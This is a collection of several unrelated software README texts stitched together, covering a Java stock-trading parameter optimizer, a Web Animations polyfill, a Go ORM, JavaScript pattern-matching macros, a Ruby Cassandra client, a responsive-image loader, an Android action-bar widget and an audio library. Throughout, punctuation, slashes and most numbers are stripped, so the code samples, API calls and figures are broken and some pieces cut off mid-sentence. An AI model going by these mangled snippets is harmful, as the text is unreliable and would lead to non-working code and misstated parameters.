that no positions are carried overnight these three components buy trigger sell trigger stop loss are the numbers bateman optimizes for using data retrieved from google to create a simulation of trading that data as if it were live the results of the trade simulation are the particle swarm algorithm s objective function every time it wants to find out how good a set of candidate parameters are it runs a full simulation with those and gets back a number that lets it quantitatively compare different solutions so that it can find better solutions the simulation of trading is what is used to drive the optimization process so what does it actually give back to you  after downloading data from the internet and running through the optimization process some sample values it might wind up spitting back would be something like buy trigger   sell trigger   stop loss   this would be interpreted to mean the following if the stock price is currently up   or more since the beginning of trading and we haven t made any other trades today then buy if after buying the stock has gone up an additional   sell additionally if after buying the stock price has gone down by   or more sell if we still haven t sold shares of stock and the end of the trading day is imminent sell regardless of current share price if we have traded once today don t trade again until the next trading day notice how this is systematic quantitative and could be automatically executed by a computer without human intervention this is why bateman is a trading system or enables systematic trading it suggests a course of action that completely removes qualitative judgment or fickle human decision making is it really worth the trouble to use an algorithm to find the buy and sell triggers well when i tried to figure out good buy and sell triggers by hand by looking at graphs of intraday data my results were significantly worse than the numbers bateman comes up with through its particle swarm algorithm so i think this program adds real value besides doing that by hand when you have a quad core computer in front of you seems silly how many shares do we buy the model i use is to just take a fixed percentage of our capital and buy as many shares as we can buy on that currently i m using  of available capital in the executable example described below which i think would be considered pretty high but bateman is long only and sets fairly tight stop losses so i think the choice is reasonable what range should we restrict our model parameters to that s a matter of preference i ll choose the following set minimum buy trigger to  allowing buying at open price set minimum stop loss and sell trigger to   of the first opening price which we ll use as a kind of proxy of the historical bid ask spread set maximum buy trigger sell trigger and stop loss to the median difference between open price and high for the last year so that we can estimate triggers that are reasonably in line with historical data to get the median figure referred to above we download daily end of day data for the last year from yahoo finance see yahooquotefetcher our choice of ranges will influence the outcomes we get see buyzoneoptimizer for how all of this comes together and tinker around with it if you want to change the ranges hopefully the assumptions implemented here are reasonable enough to be useful for simulating the performance of a trading rule to restate and summarize it takes a given set of parameters as candidate triggers and stop loss simulates that on historical data and then returns the best one it finds how to run it  you will need the following software to run this then you ll want to start by cloning the repo cd bateman then you can build the project which should be as simple as mvn package maven will download a lot of stuff the first time through it should run the project s unit tests then build a single fat jar in the target directory assuming it built successfully you should be able to run it like any other jar java jar target and bateman   snapshot jar this will then run the actual optimizer currently it is hardcoded to work on apple s stock aapl when you run this a sequence of events will occur download recent intraday quotes for the symbol in question aapl from google finance run a particle swarm optimization to find the best triggers and stop loss print the parameters it comes up with and run a final simulation with these write out a simulated trading log with profit and loss calculations for each simulated trade to a csv file you can review with any spreadsheet program a sample run  when you run this most of the outcome will be the progress of the particle swarm optimizer some sample output follows     main info o w b p simpleparticleswarmoptimizer particle swarm initialized     main info o w b p simpleparticleswarmoptimizer generation  best value   at coords

 stoploss   writing trades to and aapltrades csv writing series to and aaplseries csv the output excerpt shown above is an example of running the optimization process with the parameters listed above a  starting balance whatever historical data comes back from google finance  trading commissions etc the best values it lists are the negative sharpe ratios of the simulated trades it s running with the three numbers you see listed on each line at each iteration in other words it prints out the best triggers and stop loss it s found thus far the number should actually get lower because as an optimization algorithm it minimizes a function maximizing a function f x is in general equivalent to minimizing the function g x f x so it is trying to find minimal negative sharpe ratios at the end it prints out the best value it found in the optimization run and then writes out the given csv file whose filename you see printed above which you can open and examine here is a sample of what the csv looks like openindexcloseindexopencloseopenpriceclosepricetypesizeoutlaycostprofitbalance             long                long                long                long                long                long                long                long                long                long    each line corresponds to a simulated trade the meaning of the columns are as follows openindex and closeindex are used for plotting and can be ignored open and close are the dates the trade was started and finished respectively openprice and closeprice are the prices of the stock at the open and close dates type is the type of the trade currently this will always be long as bateman is long only size is the number of shares purchased outlaycost is the total cost of purchasing all the shares profit is the amount of profit made on each trade after accounting for slippage and commissions losses will appear as negative profit balance is the simulated account balance at the end of the trade on that line the balance column constitutes an equity curve so what does the trade log above mean how did we do overall well let s have a look the program was run on a computer on the west coast of the usa in the pdt timezone  hours behind the stock exchange in new york so here in our dataset trading commences each day at   am in the sample output above we can see all trades were opened in the morning and held anywhere from  minutes to a few hours in this dataset all our trades are profitable but if we look at the overall trend of aapl in the date range in question we see it was undergoing a long upward rally so we were really just profiting from that so while it kind of works to some extent we re just recapitulating buy and hold but in a way that in this simulation leaves us with consistent profits every time our buy trigger is   and our sell trigger is   so we re really taking advantage of a stock that in hindsight was already destined to make a large upward move for the day the optimizer will look for whatever maximizes our objective function the simulation above doesn t necessarily capture anything because of the lack of data we have access to this currently can t be helped as google finance s intraday data only seems to go back a few weeks more serious usage of this would definitely require more data plotting the results  cp csv plot cd plot vi sampleplottingscript r edit the script here r cmd batch sampleplottingscript r sample csvs are included in the project so running this as is should work you ll need the chron library which you install with install packages chron a detail of the plot is shown below the time series is plotted as you would expect and trades are then overlayed on that time series to show entries and exits there s sideways text for each trade to give dates and the exact profit amounts as well these trades are profitable so they re shown in green losing trades are shown in red it s possible to get much more elaborate with visualizing and analyzing data like this but this basically does the job well enough what s coming next  i need to look more into whether the assumptions the program makes about how it places its market orders are actually realistic i d like to make the program more configurable and more easy to understand a web frontend would be nice the facilities for analyzing and plotting trades with r could be more automated and better thank you  hopefully this long winded readme was helpful in understanding what this program does

animations are very expressive but also very complicated svg animations can t be applied to html content requestanimationframe is not a declarative approach it requires the use of the main thread and will therefore jank if the main thread is busy web animations is a new specification for animated content on the web it s being developed as a wc specification as part of the css and svg working groups it aims to address the deficiencies inherent in these four specifications web animations also aims to replace the underlying implementations of css transitions css animations and svg animations so that the code cost of supporting animations on the web is reduced the various animations specifications are interoperable spec authors and browser vendors have a single place to experiment with new animation innovations to improve the web for the future here s a simple example of an animation that scales and changes the opacity of script var elem document queryselector pulse var player document timeline play new animation elem opacity    transform scale    opacity    transform scale    direction alternate  duration  iterations infinity  and script the web animations model is a description of an engine for animation content on the web the engine is sufficiently powerful to support css transitions css animations and svg animations web animations also exposes a js api to the model this api defines a number of new interfaces that are exposed to javascript we ll go through some of the more important ones here animations animationeffects timingdictionaries timinggroups and animationplayers an animation object defines a single animation effect that applies to a single element target for example var animation new animation targetelement left px  left px   here the target element s left css property is modified smoothly from px to px over  seconds an animationeffect object controls which css properties and svg attributes are modified by an animation and the values that those properties and attributes vary between animationeffect objects also control whether the effect replaces or adds to the underlying value there are three major kinds of effects keyframeeffect  motionpatheffect  and effectcallback a keyframeeffect controls one or more properties and attributes by linearly interpolating values between specified keyframes keyframeeffects are usually defined by specifying the keyframe offset and the property value pair in a dictionary offset   left px  offset   left px  offset   left px  if the offset is not specified keyframes are evenly distributed at offsets between  and  left px  left px  left px of the keyframe distribution procedure and how keyframeeffects are evaluated at offsets outside those specified by the keyframes a motionpatheffect allows elements to be animated along svg style paths for example defs and defs and svg script var animfunc new motionpatheffect document queryselector path pathseglist var animation new animation targetelement animfunc  and script an effectcallback allows animations to generate call outs to javascript rather than manipulating properties directly please see the two different types of timinggroups animationgroup and animationsequence allow animations to be synchronized and sequenced to play a list of animations in parallel var animationgroup new animationgroup new animation  new animation to play a list in sequence var animationsequence new animationsequence new animation  new animation because animation  animationgroup  animationsequence are all timeditems groups can be nested var animationgroup new animationgroup new animationsequence new animation  new animation   new animation groups also take an optional timingdictionary parameter see below  which among other things allows iteration and timing functions to apply at the group level var animationgroup new animationgroup new animation  new animation  iterations  timingdictionaries are used to control the internal timing of an animation players control how an animation progresses relative to document time timingdictionaries have several properties that can be tweaked duration the duration of a single iteration of the animation iterations the number of iterations of the animation that will be played fractional iterations are allowed iterationstart the start offset of the first iteration fill whether the animation has effect before starting the first iteration and and or after finishing the final iteration delay the time between the animation s start time and the first animation effect of the animation playbackrate the rate at which the animation progresses relative to external time direction the direction in which successive iterations of the animation play back easing fine grained control over how external time impacts an animation across the total active duration of the animation the values provided within timingdictionaries combine with the animation hierarchy to generate concrete start and end values for animation iterations animation backwards fills and animation forwards fills there are a few simple rules which govern this animations never extend beyond the start or end values of their parent iteration animations only fill beyond their parent iteration if the relevant fill value is selected for the animation the matching fill value is selected for the parent and this is the first parent iteration for fill backwards or last parent iteration for fill forwards missing duration values for timinggroups are generated based on the calculated durations of the child animations the following example illustrates these rules var animationgroup new animationgroup new animationsequence new animation  duration   new animation  duration  fill both  duration  delay  fill none  new animation  duration  fill forwards  iterations  fill forwards in this example the animationsequence has an explicit duration of  seconds and so the second child animation will only play for the first  of its  second duration the animationgroup has no explicit duration and will be provided with a calculated duration of the max duration and delay of its children in this case  seconds although fill both is specified for the second animation within the animationsequence  the animationsequence itself has a fill of none hence as the animation ends right at the end of the animationsequence  the animation will only fill backwards and only up until the boundary of the animationsequence i e  seconds after the start of the animationgroup the animation inside the animationgroup and the animationgroup are both fill forwards therefore the animation will fill forward in two places from  seconds after the animationgroup starts until the second iteration of the animationgroup starts i e for  second from  seconds after the animationgroup starts extending forward indefinitely in order to play an animation or timinggroup  an animationplayer must be constructed var player document timeline play myanimation animationplayers provide complete control the start time and current playback head of their attached animation however players can t modify any internal details of an animation animationplayers can be used to pause seek reverse or modify the playback rate of an animation document timeline currenttime is a timeline s global time it gives the number of seconds since the document fired its load event include web animations js in your project in order to work in as many browsers as feasible we have decided to take the following approach to prefix handling the polyfill will automatically detect the correctly prefixed name to use when writing animated properties back to the platform where possible the polyfill will only accept unprefixed versions of experimental features for example var animation new animation elem transform translate px px   will work in all browsers that implement a conforming version of transform  but var animation new animation elem webkit transform translate px px   will not work anywhere when the polyfill requires features to implement functionality that is not inherently specified using those features for example css calc is required in order to implement merging between lengths with different units then the polyfill will provide a console warning in browsers where these features are absent for running tests or building minified files consult the when we make a potentially breaking change to the polyfill s api surface like a rename we ll continue supporting the old version deprecated for three months and ensure that there are console warnings that a change is pending after three months the old version of the api surface e g the old version of a function name will be removed if you see

4272815, beedb is an orm for go it lets you map go structs to tables in a database it s intended to be very lightweight doing very little beyond what you really want for example when fetching data instead of re inventing a query syntax we just delegate your query to the underlying database so you can write the where clause of your sql statements directly this allows you to have more flexibility while giving you a convenience layer but beedb also has some smart defaults for those times when complex queries aren t necessary right now it interfaces with mysql and sqlite and postgresql and db and ms adodb and odbc and oracle the goal however is to add support for other databases in the future including maybe mongodb or nosql all in all it s not entirely ready for advanced use yet but it s getting there drivers for go s sql package which support database and sql includes drivers marked with a are tested with beedb go get github com and astaxie and beedb open a database link may be will support connectionpool in the future db err sql open mymysql  test and xiemengjun and  if err nil panic err orm beedb new db with postgresql orm beedb new db pg open debug log turn on the debug beedb ondebug true model a struct after a table in the db type userinfo struct uid int beedb pk sql uid tname userinfo and and if the table s primarykey is not id  use this tag username string sql username departname string sql departname created time time sql created the structs name userinfo will turn into the table name userinfo  as defined by the tname tag if the key username will turn into the select colum username because of the sql tag create an object and save it var saveone userinfo saveone username test add user saveone departname test add departname saveone created time now orm save saveone saving new and existing objects saveone username update username saveone departname update departname saveone created time now orm save saveone and and now saveone has the primarykey value it will update fetch a single object var user userinfo orm where uid   find user var user userinfo orm where  find user and and this is shorthand for the version above var user userinfo orm where name  john find user and and more complex query var user userinfo orm where name and age  john   find user and and even more complex fetch multiple objects var allusers userinfo err orm where id   limit  findall allusers and and get id  limit  offset  var tenusers userinfo err orm where id   limit  findall tenusers and and get id  limit  if omit offset the default is  var everyone userinfo err orm findall everyone find result as map and and original sql backinfo resultsslice map string byte and and default primarykey id a  orm settable userinfo setpk uid where  select uidusername findmap update with map t make map string interface var j interface j astaxie t username j and and update one orm settable userinfo setpk uid where  update t update batch with map orm settable userinfo where uid   update t insert data with map add make map string interface j astaxie add username j j cloud develop add departname j j    add created j orm settable userinfo insert add insert batch with map addslice make map string interface add make map string interface add make map string interface j astaxie add username j j cloud develop add departname j j    add created j j astaxie add username j j cloud develop add departname j j    add created j addslice append addslice add add orm settable userinfo insert addslice join table a  orm settable userinfo join left  userdeatail  userinfo uid userdeatail uid where userinfo uid   select userinfo uiduserinfo usernameuserdeatail profile findmap group by and having a  orm settable userinfo groupby username having username astaxie findmap nesting models inline type sqlmodel struct id int beedb pk sql id created time time sql created modified time time sql modified type user struct sqlmodel sql inline name string sql name tname fngroup auth int sql auth and and the sql table has the columns id name auth created modified and and they are marshalled and unmarshalled automatically because of the inline keyword bsd license

13460631, sparkler is a pattern matching engine for javascript built using like native syntax it has no runtime dependencies and compiles down to simple if s and for s here s a small slice of what you can do with it function mypatterns and and match literals  the meaning of life  and and tag checking for js types using object tostring a string hello and a and and array destructuring front back back concat front  and and object destructuring foo bar  x y x and and custom extractors email user domain foo com user and and rest arguments a b rest rest and and rest patterns mapping a pattern over many values x y  zip x y  and and guards x number if x  x you can see a slew of more examples in the npm install g sweet js npm install sparkler sjs m sparkler and macros myfile js how does it work  sparkler overloads the function keyword as a macro don t worry all your old functions will still work but implements a slightly different syntax there s no argument list after the name or function keyword instead the function body is just a set of es style arrow lambdas separated by commas function myfunc and and single arguments don t need parens and simple expression and and bodies get an implicit return a string hello and a and and add parens and braces if you need more x y z return x and y and z you can also do this with anonymous functions db getresource   function null resp complete resp  err handleerror err if no case matches a typeerror no match is thrown optimization  sparkler doesn t just try each case one at a time until one passes that would be really inefficient instead it analyzes your entire pattern matrix and rearranges things as needed to get an optimized set of tests while still preserving the left to right top down semantics function expensiveextraction myextractor x y z   dothis  myextractor x y z  dothat let s say myextractor is really expensive sparkler efficiently backtracks so it will only get called once in this set of tests argument length  in javascript you can call a function with any number of arguments arguments that are not provided are just set to undefined sparkler does not implicitly match on argument length function ambiguous a  a b  a b c  the above function will always return  no matter how many arguments you call it with as the first case always matches the subsequent cases are actually removed from the final output in the optimization phase if you want to match on specific argument length you need to add a guard to your case function argcheck and and using arguments length a b c if arguments length   and and or matching undefined a b undefined  a  the only time sparkler is strict with argument length is with the empty parameter list it will check that arguments length is zero this is so you can do stuff like this foo prototype and and jquery style getter and setter val function this val val this val val return this if you want a catch all you should use a wildcard or default instead match keyword  sparkler exports a match macro for doing easy matching in any position match expressions look like function matching except you provide the argument s upfront var num  var isnumber match num number true false this works by desugaring match into a self invoking function with num as the argument consequently match expressions do not support break  continue  and early return using a match expression in statement position will result in a parse error match statements use a slightly different syntax they look like a suped up switch var a foo foo foo  while  match a case foo inner a inner default break unlike switch es case s in a match statement do not fall through early return  break  and switch are all supported using a match statement in expression position will result in a parse error you can match on multiple expressions at once in both match expressions and statements var allnums match num num num number number number true false match num num num case number number number allnums true default allnums false all bindings in patterns are declared as var s by default as it is the most widely supported declaration form consequently they will hoist outside of match statements you may specify your declaration form by prefixing pattern bindings with one of var  let  or const match x case foo a and and will hoist case foo var a and and will hoist case foo let a and and will not hoist case foo const a and and will not hoist immutable custom extractors  you can match on your own types by implementing a simple protocol let s build a simple extractor that parses emails from strings var email and and factor out a matching function that we ll reuse match function x string x match and and and and  null and and hasinstance is called on bare extractors hasinstance function x return email match x and and unapply is called for array like destructuring unapply function x var m email match x if m return m   m  and and unapplyobject is for object like destructuring unapplyobject function x var m email match x if m return user m   domain m  now we can use it in case arguments function dostuffwithemails and and calls unapplyobject email domain foo com  and and calls unapply email foo   and and calls hasinstance email if you don t implement hasinstance  sparkler will fall back to a simple instanceof check implements the extractor protocol out of the box and even has its own set of macros for defining data types var adt require adt simple union tree value  left tree right tree deriving adt extractor function treefn empty empty  node value string string optional extensions  sparkler also provides a small library that extends some of the native types with convenient functions require sparkler and extend and and date destructuring function datestuff date month year and and regexp destructuring function regexpstuff regexp flags i and and partial function composition with orelse function partial foo foo var total partial orelse function anything orelse is added to the prototype safely using defineproperty and isn t enumerable nathan faubion natefaubion

239681, a ruby client for the cassandra distributed database supports               and rubinius on cassandra   x through   x there is no longer much development effort being put into this gem if you are just getting started with cassandra then you probably want to use the datastax we are still happy to take patches if you want to improve this gem here is a quick sample of the general use more details in read and write api below require cassandra client cassandra new twitter       client insert users   screenname buttonscat copyright   twitter inc see included license file portions copyright   david heinemeier hansson and used with permission the cassandra project is under very active development and as such there are a few different versions that you may need to use this gem with we have set up an easy sure fire mechanism for selecting the specific version that you are connecting to while requiring the gem the default version is the currently stable release of cassandra   at this time to use the default version simply use a normal require require cassandra to use a specific version   in this example you would use a slightly differently formatted require require cassandra and   these mechanisms work well when you are using the cassandra gem in your own projects or irb but if you would rather not hard code your app to a specific version you can always specify an environment variable with the version you are using export cassandraversion   then you would use the default require as listed above require cassandra column family the column family that you are inserting into key the row key to insert hash the columns or super columns to insert options valid options are timestamp uses the current time if none specified consistency uses the default write consistency if none specified ttl if specified this is the number of seconds after the insert that this value will be available this is the main method used to insert rows into cassandra if the column family that you are inserting into is a supercolumnfamily then the hash passed in should be a nested hash otherwise it should be a flat hash this method can also be called while in batch mode if in

3985486, a cross browser framework independent responsive images loader the goal of this library is to deliver optimized contextual image sizes in responsive layouts that utilize dramatically different image sizes at different resolutions in order to improve page load time table of contents  features features  how to use howto  configuration options options  properties properties  methods methods  jquery version jquery  demos demos  testing testing  changelog changelog  contribute contribute  bug tracker issues  license license no dependencies just javascript html and css no server involved if you don t want to no cookies no htaccess no other javascript library or framework required ease of use   mins reading the docs and checking some demos and you re good to go absolute control riloadr will process only the images you tell it to unlimited breakpoints set the breakpoints you need css properties available per breakpoint minwidth  maxwidth  mindevicepixelratio plus fallback and imgformat mimics css riloadr computes the viewport s width in css pixels and finds out the optimal image size for the viewport according to the breakpoints you set through the breakpoints option sort of css media queries one request per image riloadr does not make multiple requests for the same image lazy load of images riloadr gives you the option to defer the load of all images in a group much better page load times full art direction see watchviewportwidth option in the documentation legacy content multiple image sizes a fallbacks system paired with multiple data src breakpoint name data attributes allow you to use riloadr on any website or webapp learn more about fallbacks breakpoints learn more about multiple data src breakpoint name attributes feature unpredictable image groups you can create different riloadr objects and configure each one to your needs i e a group for images in the sidebar and another one for images in the main column image retries you can configure any riloadr object to retry n times the loading of an image if it failed to load useful callbacks riloadr allows you to attach callbacks for the onload and onerror image events you can also set an oncomplete callback that fires when all images in a group are completely loaded bandwidth testing riloadr uses the wc network api to find out wether connection speed is fast enough to deliver hi res images can be disabled support for browsers with no javascript support or javascript disabled use the noscript tag or add and set the src attribute with the smallest image the latter approach may make  requests instead of  not recommended no ua sniffing riloadr does not use device detection through user agents lightweight  kb minified  kb jquery version minified jquery version available amd compatible mit license the main idea behind this technique is to leave the src attribute of img tags out of the html element altogether and instead use a data src attribute this way we avoid making multiple requests to the server for different sizes of an image once riloadr chooses the best size to deliver for the current viewport it adds the src attribute and the image is requested warning i ll use some code to explain how to use riloadr it should be self explanatory doctype html let s add a no js class to the html element so that if the browser does not support javascript we can target in css images without an src attribute and remove them from the document flow riloadr and modernizr will remove the no js class asap html boilerplate uses this technique so use it html class no js lang en meta charset utf  meta name handheldfriendly content true meta name mobileoptimized content  meta name viewport content width device width style type text and css and general styles and img max width  and to make all images fluid and  lt ie img ms interpolation mode bicubic and ie  does not scale images well and  lt ie img width  and ie  does not support max width use a container and  and image groups styles and and remove responsive images if javascript is disabled assumes noscript technique is used and no js img responsive no js img main col images display none  and recommended styles if you plan to defer the load of some images recommended specially if invisible belowfold until    defer mode is used and img responsive img main col images visibility hidden and to make

and script header deliver to these browsers the smallest image size mobile first approach  techniques available noscript tag src attribute noscript technique preferred technique  noscript tag pros

noscript and noscript and header noscript and noscript noscript and noscript and div an absolute or relative path for all images in a group var group new riloadr var group new riloadr base images and if base is not set riloadr will check for the value of the data base attribute of each img tag in a group if base is not set and the data base attribute is missing in an image riloadr will use the value of the data src attribute for that image if base is set and an image has a data base attribute the attribute s value overrides the base option for that image the breakpoints array works in a similar way to media queries in css you can configure as many breakpoints or size ranges as you need just like with media queries a breakpoint is a literal object with up to  properties name string and integer and required the breakpoint name you can set the name you prefer for any breakpoint minwidth integer and optional equivalent to min width in css media queries value should be expressed in css pixels maxwidth integer and optional equivalent to max width in css media queries value should be expressed in css pixels mindevicepixelratio float and optional equivalent to min device pixel ratio in css media queries useful for delivering high resolution images if two breakpoints only differ by this property the breakpoint containing this property should be placed in the last place fallback string and integer and optional an already defined breakpoint name to use as a fallback in case the current image size does not exist use this feature when an image of a certain size may not exist fallbacks do not cascade typical use scenarios you want to use riloadr in a website with legacy content images you want to use riloadr in a website where users can upload images that are resized on the server but depending on the original image size not all sizes of an image may be created flickr for example imgformat string and optional you can set a different image file format such as png or jpeg regardless of the initial image file format you set in the data src attribute riloadr will replace the image extension with this one just don t include the dot the breakpoint name variable the variable breakpoint name may be used multiple times in base  data base  data src data src breakpoint name values riloadr will replace breakpoint name by the name property of one of the breakpoints you ve set i can t predict or rename the file names of my images learn how riloadr gets you covered feature unpredictable let s see some examples example  var group new riloadr base and images and  breakpoints name xsmall  maxwidth   and and applied if viewport is not wider than  pixels name small  minwidth  maxwidth   name medium  minwidth  maxwidth   name large  minwidth  maxwidth   name xlarge  minwidth  and and applied if viewport is wider than  pixels  we add a data src attribute and the breakpoint name variable where we need it in this case image names have a size suffix i e wowsmall jpg wowxlarge jpg etc so we place the breakpoint name variable where the breakpoint name should be example  var group new riloadr breakpoints name mobile  maxwidth   name tablet  minwidth  maxwidth   name desktop  minwidth   in this case the breakpoint name variable is used in the base option the final url for this image will be one of these example  and and breakpoint names can be used more than once if the breakpoint properties and and are different but they apply to the same image size var group new riloadr breakpoints name low  maxwidth   and and iphone  name high  maxwidth  mindevicepixelratio   and and iphone  retina display high resolution image name high  minwidth  and and any bigger screen  in this case the breakpoint name variable is used in the base option the final url for this image will be one of these example  let s suppose you want to use riloadr only to lazy load some images and you don t care about the responsive thing riloadr is so flexible that you could do this var group new riloadr name lazy  and and change the group name optional defer belowfold  breakpoints name whatever  minwidth  and and any screen here s the trick  in this case we re not using the breakpoint name variable anywhere because let s pretend we have all images in a single size and we have no plans to dinamically create different versions sizes of them tada you can use riloadr just as an image loader example  how to use fallbacks var group new riloadr breakpoints name s  maxwidth   and and all images at this size exist name m  minwidth  maxwidth  fallback s  and and some images at this size may not exist so set a fallback to s size name xl  minwidth  maxwidth  and and all images at this size exist name xxl  minwidth  fallback xl and and some images at this size may not exist so set a fallback to xl size  the final url for this image will be one of these and hollywood s jpg and hollywood m jpg or and hollywood s jpg and hollywood xl jpg and hollywood xxl jpg or and hollywood xl jpg example  how to use imgformat var group new riloadr breakpoints name s  maxwidth  imgformat png  and and png images name m  minwidth  maxwidth  imgformat jpg and and jpg images  the final url for this image will be one of these regardless of the extension set in data src and hollywood s png and hollywood m jpg example  can t predict or rename the file names of your images no problem var group new riloadr base photos and  and and define your breakpoints as usual breakpoints name small  maxwidth   name medium  minwidth  maxwidth  fallback small  and and some images at this size may not exist so set a fallback to small size  instead of setting the data src data attribute containing the path and src to your image and the breakpoint name variable add a data src breakpoint name data attribute for each one of the breakpoints you ve defined and set their values to the corresponding path and src of your images the final url for these images will be one of these image  photos and  and cities and small and hollywood x gif photos and  and cities and med and hollywood x jpg or photos and  and cities and small and hollywood x gif image  photos and nature and tiny and rhino x png photos and nature and normal and rhino x jpg or photos and nature and tiny and rhino x png important when riloadr parses your breakpoints it mimics css behavior riloadr computes the browser s viewport width in css pixels then traverses your breakpoints to find out the appropiate image size to load and makes use of your breakpoint names to get the correct src image url to load the image remember riloadr mimics css and as such it works with css pixels not with device pixels so when you define your breakpoints use this formula to calculate screen width device screen width and device pixel ratio screen width in css pixels an example you need to target the iphone  which in portrait mode has a screen width device pixels of px the iphone  has a device pixel ratio of   device pixels equal  css pixel so if we apply the formula above we get a width of  css pixels this is the value that you should set as minwidth to target the iphone   just like in css tells riloadr to defer the load of some images three properties available mode string and required invisible images in a group will load when the user is likely to see them images in the viewport area before version    riloadr only supported the deferred load of images that were below the fold but from version    onwards riloadr employs a much friendlier bandwidth approach meaning it will only load those images inside the current viewport thus images outside of the viewport up down left or right won t get loaded until the user is likely to see them the image group automatically gets window scroll  resize and orientationchange triggers load images in a group will be loaded once the window has fully loaded window onload threshold integer and optional each image will be loaded only when it comes within threshold pixels of any side of the viewport if threshold is not set it defaults to  px this option works only with the invisible mode overflownelemsids array and optional a list of ids of elements whose content overflows them you ll identify these elements in your stylesheet looking for the overflow property if you use the invisible mode please review your stylesheet and html and add those element ids to this list this property exists because the scroll event does not bubble up and browsers only fire a scroll event on document and window when the user scrolls the entire page scrolling overflown content triggers the scroll event but it does not bubble up so riloadr has to know which elements are overflown so that it can register an event listener to them var group new riloadr defer mode invisible  threshold  overflownelmsids img gallery  my overflown div  var group new riloadr defer mode load  if mode is set to invisible and opera mini is used riloadr falls back to load mode in the case of hidpi screens riloadr will try to find out if the connection speed of the user s device is fast enough to deliver hi res images for that purpose riloadr uses the wc network api both the working and editor s drafts currently only a small subset of devices browsers support this specification although wider support is expected if a device and browser does not support the network api yet riloadr assumes a fast connection speed var group new riloadr ignorelowbandwidth true and and hi res images will be requested regardless of connection speed breakpoints name px  maxwidth   and and iphone  name px  maxwidth  mindevicepixelratio   and and iphone  retina display hi res image name px  minwidth  maxwidth   name px  minwidth   if ignorelowbandwidth is not set or is not true  it defaults to false  meaning riloadr will only request hi res images if connection speed is fast enough  what is fast enough for riloadr offline mode no internet connection bandwidth higher than  kb and s g or faster mobile networks g g are considered slow for hi res images a name to identify which images riloadr must process this name must be added to the class attribute of each img tag in a group when you create a riloadr object you re creating an image group you can create different image groups setting a different name option for each riloadr object even if all images share the same root and and we re creating  image groups that share the same root body and and each riloadr object group will only process its images identified by name var group new riloadr name group  var group new riloadr name group  body  and body image groups are awesome because you can set different options for different sets of images i e an image group for the main column another for the sidebar another for the footer and and main column id of your website var rootid main column and and both groups share the same root but each group will process and and exclusively the images identified by the name option and and use the base option to set the domain for each group var group new riloadr name sub  root rootid breakpoints var group new riloadr name sub  root rootid breakpoints and div if name is not set riloadr will look for images with the class responsive callback function that will be called when all images in a group are completely down loaded if an image fails to load it s considered loaded if new images are added dynamically to a group after the oncomplete callback is executed this callback will be executed again once those new images are loaded var group new riloadr oncomplete function console log all images loaded  callback function that will be called if an image fails to load inside the callback the reserved keyword this refers to the image if retries is set to a number greater than   riloadr will automatically try to load that image a maximum of retries times var group new riloadr onerror function console log this  callback function that will be called if an image loads successfully inside the callback the reserved keyword this refers to the image var group new riloadr onload function console log image loaded  number of times riloadr must try to load an image if it fails to load var group new riloadr retries  if retries is not set it defaults to  no retries the id attribute value of a dom element riloadr uses internally document getelementbyid root to select the element riloadr will look for images to process in the subtree underneath the specified element excluding the element itself this option allows you to define a group s scope use this option to improve image selection performance if root is not set or can t be found it falls back to the body element and and here we re creating  groups riloadr objects and each one and and has a different root although these groups share the same name and and responsive both are perfectly isolated because their scope is different and and name not set defaults to responsive var group new riloadr root main column  breakpoints and and name not set defaults to responsive var group new riloadr root sidebar  breakpoints and div and div enables dynamic art direction ever wished to load different image sizes when users resize their browser now you can easily define your breakpoints set watchviewportwidth to the mode you prefer and voil riloadr provides two different modes of dynamic art direction wider loads larger images as the browser is resized up one way riloadr finds out the widest breakpoint from those you defined for a group and will load larger images as the browser is resized up when the widest breakpoint is used largest images get displayed riloadr stops watching the viewport meaning images of smaller size won t be loaded loads smaller or larger images as the browser is resized down or up respectively both ways don t be afraid of enabling this option for mobile devices mobile browsers cannot be resized although some of them fire the resize event when certain actions occur but the viewport width isn t likely to change and that s what matters to riloadr so it s safe to assume this setting targets desktop browsers only var group new riloadr name my artistic group  breakpoints

9286207, refreshactionitem  an action bar item that implements this common pattern initially it shows a refresh button if the button is clicked a background operation begins and the button turns into a progress indicator when the background operation ends the button is restored to its initial state the progress bar shows a magnitude which represents how far the operation has proceeded the progress bar can also be made indeterminate just like the built in tt progressbar and tt it is possible to add a small badge to the action item this tells the user that there is new data available this library requires actionbarsherlock   and is thus compatible with android  x and newer if you use the new actionbarcompat instead you can use this fork  finally if you don t need  x compatibility and thus use the native action bar there is another fork  that you can use example image  try out the sample application or browse the source code  of the sample application for a complete example of use including in your project  if you re using eclipse with the adt plugin you can include refreshactionitem as a library project create a new android project in eclipse using the library and folder as the existing source then open the properties of this new project and in the android category add a reference to the actionbarsherlock library project finally in your application project properties add a reference to the created library project if you use maven to build your android project you can simply add a dependency for this library dependency groupid com github manuelpeinado refreshactionitem and groupid version    and version type apklib and type and dependency add an element for the refresh action to your xml menu android id and id and refreshbutton android actionviewclass com manuelpeinado

override public void onrefreshbuttonclick refreshactionitem sender mrefreshactionitem showprogress true startbackgroundtask from your background task call the action item s tt setprogress int and tt method each time some progress is made mrefreshactionitem setprogress progress finally when the background task is complete restore the action item to its original state mrefreshactionitem showprogress false by default the action item shows the amount of progress using a wheel there is an additional style pie  which you can activate by calling tt setprogressindicatortype progressindicatortype pie and tt on your action item also if the progress of your background task cannot be easily measured you might prefer to use an indeterminate progress indicator to achieve this just pass tt progressindicatortype indeterminate and tt to tt setprogressindicatortype and tt sometimes it is useful to give the user a visual hint suggesting that there is new data to be loaded you can easily achieve this by adding a badge to your action item mrefreshactionitem showbadge the badge shows an exclamation mark by default but you can specify an alternative text if you desire customization  you can easily customize the appearance of your refreshactionitems just define a tt refreshactionitemstyle and tt attribute in your theme and make it reference a custom style where you specify new values for any of the multiple attributes recognized by the library the following snippet is extracted from the accompanying sample application to see it in action open the styling demo in

filters oscillators fft and other analyzing tools step sequencers envelope controls noise generators samplers in addition it hosts these tools in a comprehensive framework that makes it simple to write a single effect and provides the higher level abstraction on top of that making the whole system comfortable for both users and plugin authors as for the higher level abstraction audiolib js features a sophisticated automation api alongside with pre processing hooks sample level access and buffer level management audiolib js is bundled with some tools to make an audio developer s life in a browser much easier such as sink js for a consistent api between the experimental browser audio apis to complement that audiolib js also bundles pcmdata js that is a wav encoder and decoder so that you can turn the recordings you make using sink js into wav files that the user can save other tools include the audioworker api that allows you to create web workers from strings or functions bundling audiolib js and its plugins all ready to use from the worker audiolib js is available both in browser and cli environments to install via npm npm install audiolib if you have your own please

